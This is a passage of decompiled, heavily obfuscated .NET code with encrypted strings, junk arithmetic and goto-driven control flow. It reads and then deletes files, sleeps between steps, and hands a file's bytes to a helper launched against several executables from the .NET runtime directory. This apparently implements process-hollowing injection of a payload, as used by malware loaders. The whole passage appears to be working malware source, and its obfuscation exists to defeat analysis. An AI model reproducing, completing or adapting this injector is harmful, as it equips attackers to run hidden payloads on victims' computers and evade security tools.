					goto IL_656;
				}
				arg_656_0 = ((______ / 452375622 + 3605 != -1817526503) ? (System.Type.EmptyTypes.Length + 10) : -1623541673);
				goto IL_656;
			}
			IL_1F3:
			num++;
			IL_1F9:
			string[] array3;
			if (num < array3.Length)
			{
				text8 = array3[num];
				num3 = System.Type.EmptyTypes.Length + -14822;
				arg_656_0 = sizeof(short) + -1;
				goto IL_656;
			}
			num3 = -15865;
			int __________ = <Module>.___________;
			if ((((__________ / 632 & 973078528) == (int)(973078528u & (uint)(__________ / 214225) >> 2)) ? (sizeof(System.Guid) + -6516) : (System.Type.EmptyTypes.Length + 2059923956)) != -13040)
			{
				if (!(Operators.CompareString(text7, <Module>.__________(4915, sizeof(float) + 7605, sizeof(uint) + -4), false) != 0 & Operators.CompareString(text2, <Module>.__________(System.Type.EmptyTypes.Length + 51236, sizeof(short) + 49593, 21), false) != 0 & Operators.CompareString(text6, <Module>.__________(((num2 * 31 + num2 * 33 - num2 * 536870912 & 30) == 0) ? (System.Type.EmptyTypes.Length + 49616) : (System.Type.EmptyTypes.Length + -1003924050), sizeof(short) + 53066, 178), false) != 0))
				{
					goto IL_270;
				}
				num3 = 21883;
				if ((254 * num + num * 258 - 9193 ^ 910673055) == 0)
				{
					goto IL_1F3;
				}
				array = new string[7];
				array[0] = text5;
				goto IL_2A4;
			}
			IL_226:
			string[] array4 = array2;
			num4 = 0;
			IL_22C:
			if (num4 >= array4.Length)
			{
				try
				{
					System.IO.File.Delete(text);
				}
				catch (System.Exception arg_699_0)
				{
					ProjectData.SetProjectError(arg_699_0);
					ProjectData.ClearProjectError();
				}
				text5 += <Module>._______<string>(4253958921u);
				result = text5;
				if (System.Type.EmptyTypes.Length + 27780 != 27780)
				{
				}
				return result;
			}
			string text9 = array4[num4];
			num3 = -11838;
			if (System.Type.EmptyTypes.Length + -7075 != -7075)
			{
				goto IL_278;
			}
			IL_25A:
			string[] array5;
			if (text9.Contains(<Module>.___<string>(2708903349u)))
			{
				array5 = Strings.Split(text9, <Module>._______<string>(1043067638u), -1, CompareMethod.Binary);
				num3 = sizeof(byte) + -32326;
				goto IL_C1;
			}
			IL_270:
			num4++;
			goto IL_22C;
			IL_278:
			System.Threading.Thread.Sleep(10000);
			IL_282:
			if (System.IO.File.Exists(text))
			{
				string text4 = System.IO.File.ReadAllText(text);
				arg_656_0 = System.Type.EmptyTypes.Length + 5;
				goto IL_656;
			}
			goto IL_6D3;
			IL_2A4:
			array[1] = text7;
			array[2] = <Module>.______<string>(1514956238u);
			arg_656_0 = sizeof(ulong) + -5;
			goto IL_656;
			IL_460:
			if (!_____________________________________________________________________.______________(text, _____________________________________________________________________._))
			{
				goto IL_6D3;
			}
			System.Threading.Thread.Sleep(3500);
			if (System.IO.File.Exists(text))
			{
				goto IL_282;
			}
			if ((9444 & ~(num5 * -663879680)) != 9444)
			{
				goto IL_278;
			}
			if (num3 != -30574)
			{
				goto IL_278;
			}
			goto IL_2A4;
			IL_4B3:
			array3 = array5;
			num = 0;
			goto IL_1F9;
			IL_6D3:
			result = <Module>.__________((num2 % 230 != 1097529989) ? (((1010 * num + 14 * num - (num4 * 3 + num4 - 1257847919) & 2) != 2) ? (System.Type.EmptyTypes.Length + 941375870) : (System.Type.EmptyTypes.Length + 65179)) : ((int)((System.IntPtr)(-1576650676))), 68642, sizeof(double) + 133);
		}
		catch (System.Exception expr_73F)
		{
			ProjectData.SetProjectError(expr_73F);
			System.Exception ex = expr_73F;
			______________________________________________________________.______________(<Module>._______<string>(2357608790u), <Module>.______<string>(761048916u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string _____________(string string_0)
	{
		string result;
		try
		{
			string[] array = Strings.Split(string_0, <Module>.___<string>(1801837936u), -1, CompareMethod.Binary);
			result = array[1];
		}
		catch (System.Exception expr_1C)
		{
			ProjectData.SetProjectError(expr_1C);
			int arg_E7_0 = System.Type.EmptyTypes.Length + 63388;
			int arg_E7_1 = System.Type.EmptyTypes.Length + 62726;
			int num = global::___________._;
			int arg_E7_2;
			if ((num % 32768 & 1813544960) == 0)
			{
				if ((-8421 ^ num * 15 + num) != 0)
				{
					if (-8183 + num != -(8649 & num))
					{
						if (((8175 ^ num * 68 + 60 * num) & 49) == 33)
						{
							int arg_9E_0 = -1482;
							int arg_9D_0 = 2112;
							int ______________ = <Module>._______________;
							arg_E7_2 = ((arg_9E_0 + (arg_9D_0 & ______________) != -1275) ? (System.Type.EmptyTypes.Length + 60) : 1886717413);
						}
						else
						{
							arg_E7_2 = System.Type.EmptyTypes.Length + 1512644890;
						}
					}
					else
					{
						arg_E7_2 = sizeof(System.Guid) + -1167070682;
					}
				}
				else
				{
					arg_E7_2 = System.Type.EmptyTypes.Length + -1110697287;
				}
			}
			else
			{
				arg_E7_2 = 1707050847;
			}
			result = <Module>.__________(arg_E7_0, arg_E7_1, arg_E7_2);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool ______________(string string_0, string string_1)
	{
		bool result;
		try
		{
			string string_2 = string.Format(<Module>._____<string>(574444263u), string_0);
			byte[] byte_ = System.IO.File.ReadAllBytes(string_1);
			int num = checked((int)-11619.0);
			int arg_96_0 = System.Type.EmptyTypes.Length + 1;
			while (true)
			{
				switch (arg_96_0)
				{
				case 0:
					goto IL_A5;
				}
				if (_______________________________________________________________________.___________(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + <Module>._____<string>(3966942101u), string_2, byte_, true, true, true))
				{
					goto IL_A9;
				}
				if (_______________________________________________________________________.___________(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + <Module>._______<string>(2089763217u), string_2, byte_, true, true, true))
				{
					goto IL_B4;
				}
				if (!_______________________________________________________________________.___________(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + <Module>._____<string>(1268431446u), string_2, byte_, true, true, true))
				{
					goto IL_D6;
				}
				arg_96_0 = System.Type.EmptyTypes.Length + 0;
			}
			IL_A5:
			result = true;
			return result;
			IL_A9:
			if (num != -5625)
			{
				goto IL_D2;
			}
			goto IL_CE;
			IL_B4:
			if (System.Type.EmptyTypes.Length + 12670 == -25351)
			{
				goto IL_D2;
			}
			IL_CE:
			result = true;
			return result;
			IL_D2:
			result = true;
			return result;
			IL_D6:
			if (_______________________________________________________________________.___________(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + <Module>.______<string>(3054592498u), string_2, byte_, true, true, true))
			{
				result = true;
			}
			else if (_______________________________________________________________________.___________(_____________________________________________________________________________.__, string_2, byte_, false, true, true))
			{
				result = true;
			}
			else
			{
				result = false;
			}
		}
		catch (System.Exception arg_113_0)
		{
			ProjectData.SetProjectError(arg_113_0);
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}
}
